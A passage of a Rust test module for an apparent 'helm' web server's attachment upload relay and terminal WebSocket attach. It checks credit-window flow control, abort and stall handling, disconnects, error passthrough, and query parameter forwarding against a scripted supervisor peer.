                // The short body still reaches commit — the helm never
                // second-guesses a body that simply ended.
                let frame = reader.read_frame().await.unwrap().unwrap();
                assert_eq!(frame.body.len(), 4);
                let request = parse_control(&reader.read_frame().await.unwrap().unwrap()).unwrap();
                let ControlMsg::CommitUpload { req_id, .. } = request else {
                    panic!("expected CommitUpload, got {request:?}");
                };
                writer
                    .write_control(&ControlMsg::Error {
                        req_id,
                        message: sentinel.to_string(),
                        kind: ErrorKind::InvalidRequest,
                    })
                    .await
                    .unwrap();
            });

            let harness = rest_harness::spliced_helm(client_side).await;
            let app = harness.router();

            // Four bytes against a declared ten: a body that ends early
            // without the transport ever erroring.
            let body_stream =
                futures_util::stream::iter(vec![Ok::<Vec<u8>, std::io::Error>(vec![7u8; 4])]);
            let request = axum::http::Request::builder()
                .method("POST")
                .uri("/api/sessions/sess-1/attachments")
                .header("host", "127.0.0.1:7433")
                .header("content-length", "10")
                .body(axum::body::Body::from_stream(body_stream))
                .unwrap();

            let response = app.oneshot(request).await.unwrap();
            assert_eq!(
                response.status(),
                axum::http::StatusCode::BAD_REQUEST,
                "a commit refusal's ErrorKind must pick the status, not this route"
            );
            let body = axum::body::to_bytes(response.into_body(), usize::MAX)
                .await
                .unwrap();
            assert_eq!(
                String::from_utf8_lossy(&body),
                sentinel,
                "the supervisor's commit refusal must reach the browser verbatim"
            );
            peer.await.unwrap();
        }
    }

    /// The credit window bounds the relay to at most `UPLOAD_WINDOW_BYTES`
    /// unacknowledged bytes on the wire — the pinned REST contract's
    /// "window respected" requirement. The scripted peer withholds every
    /// ack until it has proven the sender stalled at the window, then acks
    /// and proves progress resumes and the transfer still completes.
    #[tokio::test]
    async fn upload_attachment_respects_the_credit_window_then_progresses_after_an_ack() {
        use farhelm_proto::io::{FrameReader, FrameWriter, handshake, parse_control};
        use farhelm_proto::{ControlMsg, UPLOAD_CHUNK_BYTES, UPLOAD_WINDOW_BYTES};
        use tower::ServiceExt;

        // UPLOAD_WINDOW_BYTES is an exact multiple of UPLOAD_CHUNK_BYTES,
        // so "one chunk past the window" needs no remainder arithmetic.
        let total = UPLOAD_WINDOW_BYTES as usize + UPLOAD_CHUNK_BYTES;
        let content = vec![3u8; total];

        let (client_side, peer_side) = tokio::io::duplex(16 * 1024 * 1024);
        let peer = tokio::spawn(async move {
            let (r, w) = tokio::io::split(peer_side);
            let mut reader = FrameReader::new(r);
            let mut writer = FrameWriter::new(w);
            handshake(&mut reader, &mut writer, "supervisor")
                .await
                .unwrap();
            (reader, writer)
        });

        let harness = rest_harness::spliced_helm(client_side).await;
        let app = harness.router();
        let (mut peer_reader, mut peer_writer) = peer.await.unwrap();

        let request = axum::http::Request::builder()
            .method("POST")
            .uri("/api/sessions/sess-1/attachments")
            .header("host", "127.0.0.1:7433")
            .header("content-length", total.to_string())
            .body(axum::body::Body::from(content))
            .unwrap();
        let response_task = tokio::spawn(app.oneshot(request));

        let begin = parse_control(&peer_reader.read_frame().await.unwrap().unwrap()).unwrap();
        let ControlMsg::BeginUpload {
            req_id, channel, ..
        } = begin
        else {
            panic!("expected BeginUpload, got {begin:?}");
        };
        peer_writer
            .write_control(&ControlMsg::UploadStarted { req_id, channel })
            .await
            .unwrap();

        let mut received = 0u64;
        while received < UPLOAD_WINDOW_BYTES {
            let frame = tokio::time::timeout(Duration::from_secs(5), peer_reader.read_frame())
                .await
                .expect("timed out waiting for the initial window")
                .unwrap()
                .expect("connection closed mid-window");
            received += frame.body.len() as u64;
        }
        assert_eq!(received, UPLOAD_WINDOW_BYTES);

        assert!(
            tokio::time::timeout(Duration::from_millis(300), peer_reader.read_frame())
                .await
                .is_err(),
            "the relay sent more than UPLOAD_WINDOW_BYTES before any ack"
        );
        assert!(!response_task.is_finished());

        peer_writer
            .write_control(&ControlMsg::UploadAck {
                channel,
                received: UPLOAD_WINDOW_BYTES,
            })
            .await
            .unwrap();

        let frame = tokio::time::timeout(Duration::from_secs(5), peer_reader.read_frame())
            .await
            .expect("the final chunk never arrived after the ack")
            .unwrap()
            .expect("connection closed after the ack");
        assert_eq!(frame.body.len(), UPLOAD_CHUNK_BYTES);

        let commit = parse_control(&peer_reader.read_frame().await.unwrap().unwrap()).unwrap();
        let ControlMsg::CommitUpload { req_id, .. } = commit else {
            panic!("expected CommitUpload, got {commit:?}");
        };
        peer_writer
            .write_control(&ControlMsg::UploadCommitted {
                req_id,
                path: "/tmp/windowed.bin".to_string(),
            })
            .await
            .unwrap();

        let response = tokio::time::timeout(Duration::from_secs(5), response_task)
            .await
            .expect("the response never completed")
            .expect("handler task panicked")
            .unwrap();
        assert_eq!(response.status(), axum::http::StatusCode::OK);
    }

    /// A client disconnecting mid-body must reach the supervisor as
    /// `AbortUpload`, never a silent hang or a `CommitUpload` for bytes
    /// that never fully arrived — the pinned REST contract's own words.
    /// The body is a stream that yields a partial chunk and then a hard
    /// `Err`, which is how a genuine disconnect surfaces once
    /// `Content-Length` framing is in play: the transport cannot honestly
    /// deliver a short body any other way once it has promised an exact
    /// byte count.
    ///
    /// The partial deliberately overruns one `UPLOAD_CHUNK_BYTES` so both
    /// halves are observable: the full frame that had already been
    /// rechunked out, and then the abort. The sub-chunk tail behind it is
    /// simply dropped — flushing bytes for a transfer that is being
    /// abandoned would only make the supervisor write more of a file it
    /// is about to delete.
    #[tokio::test]
    async fn upload_attachment_client_disconnect_mid_body_sends_abort_upload() {
        use farhelm_proto::io::{FrameReader, FrameWriter, handshake, parse_control};
        use farhelm_proto::{ControlMsg, UPLOAD_CHUNK_BYTES};
        use tower::ServiceExt;

        let declared_size = (UPLOAD_CHUNK_BYTES * 10) as u64;
        let partial = vec![5u8; UPLOAD_CHUNK_BYTES + 100];

        let (client_side, peer_side) = tokio::io::duplex(64 * 1024);
        let peer = tokio::spawn(async move {
            let (r, w) = tokio::io::split(peer_side);
            let mut reader = FrameReader::new(r);
            let mut writer = FrameWriter::new(w);
            handshake(&mut reader, &mut writer, "supervisor")
                .await
                .unwrap();
            let request = parse_control(&reader.read_frame().await.unwrap().unwrap()).unwrap();
            let ControlMsg::BeginUpload {
                req_id,
                channel,
                size,
                ..
            } = request
            else {
                panic!("expected BeginUpload, got {request:?}");
            };
            assert_eq!(size, declared_size);
            writer
                .write_control(&ControlMsg::UploadStarted { req_id, channel })
                .await
                .unwrap();

            // The partial bytes arrive as ordinary data frames...
            let frame = reader.read_frame().await.unwrap().unwrap();
            assert_eq!(frame.body.len(), UPLOAD_CHUNK_BYTES);
            assert!(frame.body.iter().all(|b| *b == 5));

            // ...and then the disconnect must show up as AbortUpload,
            // never a CommitUpload for the (never fully sent) declared
            // size.
            let next = parse_control(&reader.read_frame().await.unwrap().unwrap()).unwrap();
            assert!(
                matches!(next, ControlMsg::AbortUpload { channel: c } if c == channel),
                "expected AbortUpload after a mid-body disconnect, got {next:?}"
            );
        });

        let harness = rest_harness::spliced_helm(client_side).await;
        let app = harness.router();

        // A stream that yields the partial body and then a hard error —
        // the disconnect. `into` converts each item's error into the
        // trait object `Body::from_stream` requires.
        let body_stream = futures_util::stream::iter(vec![
            Ok::<Vec<u8>, std::io::Error>(partial.clone()),
            Err(std::io::Error::other("simulated client disconnect")),
        ]);
        let request = axum::http::Request::builder()
            .method("POST")
            .uri("/api/sessions/sess-1/attachments")
            .header("host", "127.0.0.1:7433")
            .header("content-length", declared_size.to_string())
            .body(axum::body::Body::from_stream(body_stream))
            .unwrap();

        let response = app.oneshot(request).await.unwrap();
        assert_eq!(
            response.status(),
            axum::http::StatusCode::BAD_REQUEST,
            "a body that ends in a transport error must not read as a supervisor-side fault"
        );

        peer.await.unwrap();
    }

    /// An `UploadAborted` arriving mid-stream (the supervisor giving up —
    /// a storage error, its own stall timeout, session deletion) must
    /// reach the browser as the mapped error carrying the reason text —
    /// the pinned REST contract's "500-class with the reason text", never
    /// a bare disconnect or a success.
    #[tokio::test]
    async fn upload_attachment_aborted_mid_stream_maps_to_an_error_with_the_reason() {
        use farhelm_proto::io::{FrameReader, FrameWriter, handshake, parse_control};
        use farhelm_proto::{ControlMsg, UPLOAD_CHUNK_BYTES, UPLOAD_WINDOW_BYTES};
        use tower::ServiceExt;

        const SENTINEL: &str = "SENTINEL-upload-aborted-mid-stream: disk full";
        let total = UPLOAD_WINDOW_BYTES as usize + UPLOAD_CHUNK_BYTES;
        let content = vec![4u8; total];

        let (client_side, peer_side) = tokio::io::duplex(16 * 1024 * 1024);
        let peer = tokio::spawn(async move {
            let (r, w) = tokio::io::split(peer_side);
            let mut reader = FrameReader::new(r);
            let mut writer = FrameWriter::new(w);
            handshake(&mut reader, &mut writer, "supervisor")
                .await
                .unwrap();
            let request = parse_control(&reader.read_frame().await.unwrap().unwrap()).unwrap();
            let ControlMsg::BeginUpload {
                req_id, channel, ..
            } = request
            else {
                panic!("expected BeginUpload, got {request:?}");
            };
            writer
                .write_control(&ControlMsg::UploadStarted { req_id, channel })
                .await
                .unwrap();

            // Drain exactly the initial window, then give up instead of
            // acking — the relay must still be mid-transfer (parked on
            // credit for the chunk past the window) when this arrives.
            let mut received = 0u64;
            while received < UPLOAD_WINDOW_BYTES {
                let frame = reader.read_frame().await.unwrap().unwrap();
                received += frame.body.len() as u64;
            }
            writer
                .write_control(&ControlMsg::UploadAborted {
                    channel,
                    reason: SENTINEL.to_string(),
                })
                .await
                .unwrap();
        });

        let harness = rest_harness::spliced_helm(client_side).await;
        let app = harness.router();

        let request = axum::http::Request::builder()
            .method("POST")
            .uri("/api/sessions/sess-1/attachments")
            .header("host", "127.0.0.1:7433")
            .header("content-length", total.to_string())
            .body(axum::body::Body::from(content))
            .unwrap();

        let response = app.oneshot(request).await.unwrap();
        assert_eq!(
            response.status(),
            axum::http::StatusCode::INTERNAL_SERVER_ERROR
        );
        let body = axum::body::to_bytes(response.into_body(), usize::MAX)
            .await
            .unwrap();
        assert_eq!(
            String::from_utf8_lossy(&body),
            SENTINEL,
            "the abort reason must reach the body verbatim"
        );

        peer.await.unwrap();
    }

    /// An `UploadAborted` that arrives while the relay is waiting on the
    /// BROWSER — not on credit — must still end the request promptly and
    /// carry the supervisor's reason verbatim.
    ///
    /// This is where a transfer spends most of its life, and the case the
    /// mid-stream abort test above cannot reach: there, a credit wait
    /// happened to be parked with a receiver subscribed at the exact
    /// instant the abort landed. Here the body is GATED — one chunk, then
    /// nothing, forever — so an implementation that only noticed aborts
    /// while sending would sit until the browser's stall timeout and then
    /// report a stall instead of the storage failure that actually ended
    /// the upload.
    #[tokio::test]
    async fn upload_attachment_abort_while_awaiting_the_body_ends_the_request() {
        use farhelm_proto::ControlMsg;
        use farhelm_proto::io::{FrameReader, FrameWriter, handshake, parse_control};
        use tower::ServiceExt;

        const SENTINEL: &str = "SENTINEL-abort-awaiting-body: storage went away";

        let (client_side, peer_side) = tokio::io::duplex(64 * 1024);
        let peer = tokio::spawn(async move {
            let (r, w) = tokio::io::split(peer_side);
            let mut reader = FrameReader::new(r);
            let mut writer = FrameWriter::new(w);
            handshake(&mut reader, &mut writer, "supervisor")
                .await
                .unwrap();
            let request = parse_control(&reader.read_frame().await.unwrap().unwrap()).unwrap();
            let ControlMsg::BeginUpload {
                req_id, channel, ..
            } = request
            else {
                panic!("expected BeginUpload, got {request:?}");
            };
            writer
                .write_control(&ControlMsg::UploadStarted { req_id, channel })
                .await
                .unwrap();

            let frame = reader.read_frame().await.unwrap().unwrap();
            assert_eq!(frame.body.len(), 4);
            writer
                .write_control(&ControlMsg::UploadAborted {
                    channel,
                    reason: SENTINEL.to_string(),
                })
                .await
                .unwrap();
            (reader, writer)
        });

        let harness = rest_harness::spliced_helm(client_side).await;
        let app = harness.router();

        // The sender is held for the whole test, so the body stream stays
        // pending after its one chunk rather than ending.
        let (body_tx, body_rx) = tokio::sync::mpsc::channel::<Vec<u8>>(1);
        body_tx.send(vec![3u8; 4]).await.unwrap();
        let body_stream = futures_util::stream::unfold(body_rx, |mut rx| async move {
            rx.recv()
                .await
                .map(|item| (Ok::<Vec<u8>, std::io::Error>(item), rx))
        });
        let request = axum::http::Request::builder()
            .method("POST")
            .uri("/api/sessions/sess-1/attachments")
            .header("host", "127.0.0.1:7433")
            .header("content-length", "4096")
            .body(axum::body::Body::from_stream(body_stream))
            .unwrap();

        let response = tokio::time::timeout(Duration::from_secs(5), app.oneshot(request))
            .await
            .expect("the abort did not end the request while the body was still pending")
            .unwrap();
        assert_eq!(
            response.status(),
            axum::http::StatusCode::INTERNAL_SERVER_ERROR
        );
        let body = axum::body::to_bytes(response.into_body(), usize::MAX)
            .await
            .unwrap();
        assert_eq!(
            String::from_utf8_lossy(&body),
            SENTINEL,
            "the abort reason must reach the body verbatim, not be replaced by a stall or a \
             generic failure"
        );

        drop(body_tx);
        let _peer = peer.await.unwrap();
    }

    /// The same retention one step later: an `UploadAborted` racing the
    /// commit must surface as ITS reason, not as whatever the commit
    /// exchange would have collected for a channel the supervisor already
    /// tore down.
    ///
    /// The peer never answers the commit, deliberately. That leaves the
    /// abort as the only thing that can end this request, so an
    /// implementation which dropped the abort — or which waited on the
    /// commit reply without watching for one — hangs instead of quietly
    /// reporting something plausible.
    #[tokio::test]
    async fn upload_attachment_abort_racing_the_commit_surfaces_the_abort_reason() {
        use farhelm_proto::ControlMsg;
        use farhelm_proto::io::{FrameReader, FrameWriter, handshake, parse_control};
        use tower::ServiceExt;

        const SENTINEL: &str = "SENTINEL-abort-racing-commit: session deleted mid-transfer";

        let (client_side, peer_side) = tokio::io::duplex(64 * 1024);
        let peer = tokio::spawn(async move {
            let (r, w) = tokio::io::split(peer_side);
            let mut reader = FrameReader::new(r);
            let mut writer = FrameWriter::new(w);
            handshake(&mut reader, &mut writer, "supervisor")
                .await
                .unwrap();
            let request = parse_control(&reader.read_frame().await.unwrap().unwrap()).unwrap();
            let ControlMsg::BeginUpload {
                req_id, channel, ..
            } = request
            else {
                panic!("expected BeginUpload, got {request:?}");
            };
            writer
                .write_control(&ControlMsg::UploadStarted { req_id, channel })
                .await
                .unwrap();
            let frame = reader.read_frame().await.unwrap().unwrap();
            assert_eq!(frame.body.len(), 4);
            writer
                .write_control(&ControlMsg::UploadAborted {
                    channel,
                    reason: SENTINEL.to_string(),
                })
                .await
                .unwrap();
            (reader, writer)
        });

        let harness = rest_harness::spliced_helm(client_side).await;
        let app = harness.router();

        // The body ends normally, so the relay proceeds to commit — into
        // a supervisor that has already given up and will never answer.
        let request = axum::http::Request::builder()
            .method("POST")
            .uri("/api/sessions/sess-1/attachments")
            .header("host", "127.0.0.1:7433")
            .header("content-length", "4")
            .body(axum::body::Body::from(vec![3u8; 4]))
            .unwrap();

        let response = tokio::time::timeout(Duration::from_secs(5), app.oneshot(request))
            .await
            .expect("the request hung waiting for a commit reply that will never come")
            .unwrap();
        assert_eq!(
            response.status(),
            axum::http::StatusCode::INTERNAL_SERVER_ERROR
        );
        let body = axum::body::to_bytes(response.into_body(), usize::MAX)
            .await
            .unwrap();
        assert_eq!(String::from_utf8_lossy(&body), SENTINEL);

        let _peer = peer.await.unwrap();
    }

    /// Empty body chunks are not progress. A stream may legally yield
    /// zero-length items forever, and a relay that rearmed its stall
    /// deadline on every yielded ITEM rather than on relayed BYTES would
    /// keep such an upload — and the supervisor's temp file behind it —
    /// alive indefinitely while transferring nothing.
    ///
    /// Runs on a paused clock, so `CLIENT_UPLOAD_STALL_TIMEOUT` is
    /// observed exactly rather than waited out: the body's own small
    /// sleeps are what let virtual time advance, and the correct
    /// implementation gives up once sixty seconds of them have passed. An
    /// implementation that rearms per item never gives up, exhausts the
    /// (bounded) stream, and fails on the wrong outcome instead of
    /// hanging.
    #[tokio::test(start_paused = true)]
    async fn upload_attachment_endless_empty_body_chunks_stall_out() {
        use farhelm_proto::ControlMsg;
        use farhelm_proto::io::{FrameReader, FrameWriter, handshake, parse_control};
        use tower::ServiceExt;

        let (client_side, peer_side) = tokio::io::duplex(64 * 1024);
        let peer = tokio::spawn(async move {
            let (r, w) = tokio::io::split(peer_side);
            let mut reader = FrameReader::new(r);
            let mut writer = FrameWriter::new(w);
            handshake(&mut reader, &mut writer, "supervisor")
                .await
                .unwrap();
            let request = parse_control(&reader.read_frame().await.unwrap().unwrap()).unwrap();
            let ControlMsg::BeginUpload {
                req_id, channel, ..
            } = request
            else {
                panic!("expected BeginUpload, got {request:?}");
            };
            writer
                .write_control(&ControlMsg::UploadStarted { req_id, channel })
                .await
                .unwrap();

            let next = parse_control(&reader.read_frame().await.unwrap().unwrap()).unwrap();
            assert!(
                matches!(next, ControlMsg::AbortUpload { channel: c } if c == channel),
                "a body that never delivers a byte must be abandoned, not fed to a commit: \
                 {next:?}"
            );
        });

        let harness = rest_harness::spliced_helm(client_side).await;
        let app = harness.router();

        // Bounded rather than truly endless: a per-item rearm bug must
        // fail this test on the outcome, not hang the suite. 300 virtual
        // seconds is comfortably past the 60-second deadline.
        let body_stream = futures_util::stream::unfold(0usize, |n| async move {
            if n >= 300 {
                return None;
            }
            tokio::time::sleep(Duration::from_secs(1)).await;
            Some((Ok::<Vec<u8>, std::io::Error>(Vec::new()), n + 1))
        });
        let request = axum::http::Request::builder()
            .method("POST")
            .uri("/api/sessions/sess-1/attachments")
            .header("host", "127.0.0.1:7433")
            .header("content-length", "4096")
            .body(axum::body::Body::from_stream(body_stream))
            .unwrap();

        let response = app.oneshot(request).await.unwrap();
        assert_eq!(
            response.status(),
            axum::http::StatusCode::INTERNAL_SERVER_ERROR
        );
        let body = axum::body::to_bytes(response.into_body(), usize::MAX)
            .await
            .unwrap();
        assert_eq!(
            String::from_utf8_lossy(&body),
            farhelm_proto::UPLOAD_ABORT_REASON_STALLED,
            "a no-progress upload must report the shared stalled reason"
        );

        peer.await.unwrap();
    }

    /// A cancelled handler must still release the supervisor's half of the
    /// transfer.
    ///
    /// This is the pinned contract's "client disconnect before commit =>
    /// AbortUpload" in its harshest form: a reset connection cancels the
    /// axum handler outright, so no error branch of the relay runs at all.
    /// The abort therefore cannot live in a branch — it has to belong to
    /// the upload's owner and fire from its destructor — and this test
    /// drops the handler at the worst moment, parked on a closed credit
    /// window, to prove it does.
    #[tokio::test]
    async fn upload_attachment_cancelled_handler_still_aborts_upstream() {
        use farhelm_proto::io::{FrameReader, FrameWriter, handshake, parse_control};
        use farhelm_proto::{ControlMsg, UPLOAD_CHUNK_BYTES, UPLOAD_WINDOW_BYTES};
        use tower::ServiceExt;

        let total = UPLOAD_WINDOW_BYTES as usize + UPLOAD_CHUNK_BYTES;

        let (client_side, peer_side) = tokio::io::duplex(16 * 1024 * 1024);
        let peer = tokio::spawn(async move {
            let (r, w) = tokio::io::split(peer_side);
            let mut reader = FrameReader::new(r);
            let mut writer = FrameWriter::new(w);
            handshake(&mut reader, &mut writer, "supervisor")
                .await
                .unwrap();
            (reader, writer)
        });

        let harness = rest_harness::spliced_helm(client_side).await;
        let app = harness.router();
        let (mut peer_reader, mut peer_writer) = peer.await.unwrap();

        let request = axum::http::Request::builder()
            .method("POST")
            .uri("/api/sessions/sess-1/attachments")
            .header("host", "127.0.0.1:7433")
            .header("content-length", total.to_string())
            .body(axum::body::Body::from(vec![5u8; total]))
            .unwrap();
        let handler = tokio::spawn(app.oneshot(request));

        let begin = parse_control(&peer_reader.read_frame().await.unwrap().unwrap()).unwrap();
        let ControlMsg::BeginUpload {
            req_id, channel, ..
        } = begin
        else {
            panic!("expected BeginUpload, got {begin:?}");
        };
        peer_writer
            .write_control(&ControlMsg::UploadStarted { req_id, channel })
            .await
            .unwrap();

        // Take the whole window and withhold every ack, so the handler is
        // genuinely parked when it is cancelled.
        let mut received = 0u64;
        while received < UPLOAD_WINDOW_BYTES {
            let frame = tokio::time::timeout(Duration::from_secs(5), peer_reader.read_frame())
                .await
                .expect("timed out waiting for the initial window")
                .unwrap()
                .expect("connection closed mid-window");
            received += frame.body.len() as u64;
        }
        assert!(!handler.is_finished());

        handler.abort();

        let frame = tokio::time::timeout(Duration::from_secs(5), peer_reader.read_frame())
            .await
            .expect("a cancelled handler never released the supervisor's upload")
            .unwrap()
            .expect("connection closed before the abort arrived");
        assert!(
            matches!(
                parse_control(&frame).unwrap(),
                ControlMsg::AbortUpload { channel: c } if c == channel
            ),
            "a cancelled handler must abort the transfer it started"
        );
    }

    /// A `BeginUpload` refusal (admission cap, a vanished attachments
    /// directory, any supervisor-side precondition) must reach the browser
    /// through the same `http_error` mapping every other endpoint uses,
    /// with the supervisor's message verbatim — the pinned REST contract's
    /// "sentinel-testable" promise, exercised here specifically for the
    /// attachments route rather than assumed from the other endpoints'
    /// coverage.
    ///
    /// Deliberately aimed at a session the helm DOES know (PLAN_M6.md item
    /// 5): an id the merged view has never heard of is now refused by the
    /// helm's own owner lookup before any host is contacted, so pointing
    /// this at one would test the helm's 404 rather than the passthrough it
    /// exists to pin.
    #[tokio::test]
    async fn upload_attachment_begin_error_reply_passes_through_the_sentinel_message() {
        use farhelm_proto::io::{FrameReader, FrameWriter, handshake, parse_control};
        use farhelm_proto::{ControlMsg, ErrorKind};
        use tower::ServiceExt;

        const SENTINEL: &str = "SENTINEL-begin-upload-7a2c9f: the attachments directory is gone";

        let (client_side, peer_side) = tokio::io::duplex(64 * 1024);
        let peer = tokio::spawn(async move {
            let (r, w) = tokio::io::split(peer_side);
            let mut reader = FrameReader::new(r);
            let mut writer = FrameWriter::new(w);
            handshake(&mut reader, &mut writer, "supervisor")
                .await
                .unwrap();
            let request = parse_control(&reader.read_frame().await.unwrap().unwrap()).unwrap();
            let ControlMsg::BeginUpload { req_id, .. } = request else {
                panic!("expected BeginUpload, got {request:?}");
            };
            writer
                .write_control(&ControlMsg::Error {
                    req_id,
                    message: SENTINEL.to_string(),
                    kind: ErrorKind::NotFound,
                })
                .await
                .unwrap();
        });

        let harness = rest_harness::spliced_helm(client_side).await;
        let app = harness.router();

        let request = axum::http::Request::builder()
            .method("POST")
            .uri("/api/sessions/sess-1/attachments")
            .header("host", "127.0.0.1:7433")
            .header("content-length", "3")
            .body(axum::body::Body::from(vec![1u8, 2, 3]))
            .unwrap();

        let response = app.oneshot(request).await.unwrap();
        assert_eq!(response.status(), axum::http::StatusCode::NOT_FOUND);
        let body = axum::body::to_bytes(response.into_body(), usize::MAX)
            .await
            .unwrap();
        assert_eq!(
            String::from_utf8_lossy(&body),
            SENTINEL,
            "body must carry the supervisor's own message verbatim, not a substring of it"
        );

        peer.await.unwrap();
    }

    /// An absent `?filename=` must forward as the empty proposal —
    /// SPEC.md/`ControlMsg::BeginUpload`'s "names are never a refusal"
    /// contract — never a locally-invented default name and never a
    /// refusal. A present-but-empty `?filename=` shares the same decode
    /// (see `UploadQuery`'s own docs), so only the absent case needs its
    /// own test.
    #[tokio::test]
    async fn upload_attachment_absent_filename_forwards_as_the_empty_proposal() {
        use farhelm_proto::io::{FrameReader, FrameWriter, handshake, parse_control};
        use farhelm_proto::{ControlMsg, ErrorKind};
        use tower::ServiceExt;

        let (client_side, peer_side) = tokio::io::duplex(64 * 1024);
        let peer = tokio::spawn(async move {
            let (r, w) = tokio::io::split(peer_side);
            let mut reader = FrameReader::new(r);
            let mut writer = FrameWriter::new(w);
            handshake(&mut reader, &mut writer, "supervisor")
                .await
                .unwrap();
            let request = parse_control(&reader.read_frame().await.unwrap().unwrap()).unwrap();
            let ControlMsg::BeginUpload {
                req_id, filename, ..
            } = request
            else {
                panic!("expected BeginUpload, got {request:?}");
            };
            assert_eq!(
                filename, "",
                "an absent ?filename= must forward as the empty proposal, never a made-up name"
            );
            writer
                .write_control(&ControlMsg::Error {
                    req_id,
                    message: "stop here; the filename assertion above is this test's point"
                        .to_string(),
                    kind: ErrorKind::Internal,
                })
                .await
                .unwrap();
        });

        let harness = rest_harness::spliced_helm(client_side).await;
        let app = harness.router();

        let request = axum::http::Request::builder()
            .method("POST")
            .uri("/api/sessions/sess-1/attachments")
            .header("host", "127.0.0.1:7433")
            .header("content-length", "3")
            .body(axum::body::Body::from(vec![1u8, 2, 3]))
            .unwrap();

        let response = app.oneshot(request).await.unwrap();
        assert_eq!(
            response.status(),
            axum::http::StatusCode::INTERNAL_SERVER_ERROR
        );

        peer.await.unwrap();
    }

    /// A request with no (or an unparsable) `Content-Length` cannot
    /// declare a size to `BeginUpload` at all, and is refused locally
    /// without ever contacting the supervisor — mirroring
    /// `term_ws_with_empty_lease_is_refused_locally_without_contacting_the_supervisor`'s
    /// pattern for the one shape check the helm makes on its own behalf.
    #[tokio::test]
    async fn upload_attachment_missing_content_length_is_refused_locally() {
        use tower::ServiceExt;

        let (client_side, peer_side) = tokio::io::duplex(64 * 1024);
        // The peer never needs to answer anything — a refusal that
        // touched the supervisor would show up as this connection
        // observing a frame it never expected, so the peer intentionally
        // does nothing but the handshake and is dropped at the end of the
        // test still holding an unread connection.
        let peer = tokio::spawn(async move {
            let (r, w) = tokio::io::split(peer_side);
            let mut reader = FrameReader::new(r);
            let mut writer = FrameWriter::new(w);
            handshake(&mut reader, &mut writer, "supervisor")
                .await
                .unwrap();
            (reader, writer)
        });

        let harness = rest_harness::spliced_helm(client_side).await;
        let app = harness.router();

        // Built with no Content-Length at all: the request builder sets
        // no headers of its own, and `Body::from` only gives the body an
        // exact size HINT — nothing synthesizes the header a real client
        // would have sent. This is the raw-client shape the check exists
        // for.
        let request = axum::http::Request::builder()
            .method("POST")
            .uri("/api/sessions/sess-1/attachments")
            .header("host", "127.0.0.1:7433")
            .body(axum::body::Body::from(vec![1u8, 2, 3]))
            .unwrap();
        assert!(
            !request
                .headers()
                .contains_key(axum::http::header::CONTENT_LENGTH),
            "this test is only meaningful while the builder leaves Content-Length absent"
        );

        let response = app.oneshot(request).await.unwrap();
        assert_eq!(response.status(), axum::http::StatusCode::BAD_REQUEST);

        let _peer = peer.await.unwrap();
    }

    /// The three ways a WS attach's selector/lease resolve to an `Attach`
    /// frame — neither param (the legacy pre-M4 reading), `?tab=` alone,
    /// `?lease=` alone — share one assertion shape (the resolved
    /// `terminal`/`lease` pair reaching the supervisor's `Attach`) and
    /// differ only in the query string and the expected pair, so one
    /// parameterized test replaces three near-identical ones.
    /// `term_ws_with_tab_and_lease_together_carries_both_on_one_attach`
    /// below is deliberately NOT folded in here: it is the one case whose
    /// entire point is that two fields combine on the SAME frame, which a
    /// shared loop body would only obscure.
    #[tokio::test]
    async fn term_ws_selector_and_lease_reach_the_attach_frame() {
        use farhelm_proto::io::{FrameReader, FrameWriter, handshake, parse_control};
        use farhelm_proto::{ControlMsg, TerminalSelector};

        let cases: [(&str, TerminalSelector, &str); 3] = [
            ("", TerminalSelector::Agent, ""),
            (
                "?tab=tab-1",
                TerminalSelector::Tab { id: "tab-1".into() },
                "",
            ),
            ("?lease=client-abc", TerminalSelector::Agent, "client-abc"),
        ];

        for (query, expected_terminal, expected_lease) in cases {
            let (client_side, peer_side) = tokio::io::duplex(64 * 1024);
            let peer = tokio::spawn(async move {
                let (r, w) = tokio::io::split(peer_side);
                let mut reader = FrameReader::new(r);
                let mut writer = FrameWriter::new(w);
                handshake(&mut reader, &mut writer, "supervisor")
                    .await
                    .unwrap();
                let request = parse_control(&reader.read_frame().await.unwrap().unwrap()).unwrap();
                let ControlMsg::Attach {
                    req_id,
                    channel,
                    terminal,
                    lease,
                    ..
                } = request
                else {
                    panic!("expected Attach, got {request:?}");
                };
                assert_eq!(terminal, expected_terminal, "for query {query:?}");
                assert_eq!(lease, expected_lease, "for query {query:?}");
                writer
                    .write_control(&ControlMsg::Attached { req_id, channel })
                    .await
                    .unwrap();
            });

            let mut harness = rest_harness::spliced_helm(client_side).await;
            let addr = harness.serve().await;
            let path = format!("/api/sessions/sess-1/term{query}");
            let (_ws, peer) = tokio::join!(WsTestClient::connect(addr, &path), peer);
            peer.unwrap();
        }
    }

    /// `?tab=<id>&lease=<id>` together must carry BOTH fields onto the
    /// SAME `Attach` — the parameterized selector test above deliberately
    /// covers each field in isolation, which would not catch a
    /// regression where handling one query param clobbers the other
    /// (e.g. an extractor path that overwrites `terminal` and forgets to
    /// also thread `lease`, or vice versa).
    #[tokio::test]
    async fn term_ws_with_tab_and_lease_together_carries_both_on_one_attach() {
        use farhelm_proto::io::{FrameReader, FrameWriter, handshake, parse_control};
        use farhelm_proto::{ControlMsg, TerminalSelector};

        let (client_side, peer_side) = tokio::io::duplex(64 * 1024);
        let peer = tokio::spawn(async move {
            let (r, w) = tokio::io::split(peer_side);
            let mut reader = FrameReader::new(r);
            let mut writer = FrameWriter::new(w);
            handshake(&mut reader, &mut writer, "supervisor")
                .await
                .unwrap();
            let request = parse_control(&reader.read_frame().await.unwrap().unwrap()).unwrap();
            let ControlMsg::Attach {
                req_id,
                channel,
                terminal,
                lease,
                ..
            } = request
            else {
                panic!("expected Attach, got {request:?}");
            };
            assert_eq!(terminal, TerminalSelector::Tab { id: "tab-1".into() });
            assert_eq!(lease, "client-abc");
            writer
                .write_control(&ControlMsg::Attached { req_id, channel })
                .await
                .unwrap();
        });

        let mut harness = rest_harness::spliced_helm(client_side).await;
        let addr = harness.serve().await;
        let (_ws, peer) = tokio::join!(
            WsTestClient::connect(addr, "/api/sessions/sess-1/term?tab=tab-1&lease=client-abc"),
            peer
        );
        peer.unwrap();
    }

    /// An unknown `?tab=` id must surface on the WebSocket exactly like
    /// any other attach failure (PLAN_M4.md item 5): a
    /// `{"type":"detached",...}` notice carrying the supervisor's own
    /// `NotFound` message, then the socket closes — never a bare
    /// disconnect a browser would blame on the network instead of the
    /// session. The supervisor owns the real "does this tab exist" check
    /// (see `resolve_attach_request`'s docs, including for why `?tab=`
    /// gets no local shape check at all); this test is what proves its
    /// `NotFound` reaches the client rather than being swallowed
    /// somewhere in the WS plumbing this PR adds. Both the notice recv
    /// AND the close recv are wrapped in a bounded timeout: a regression
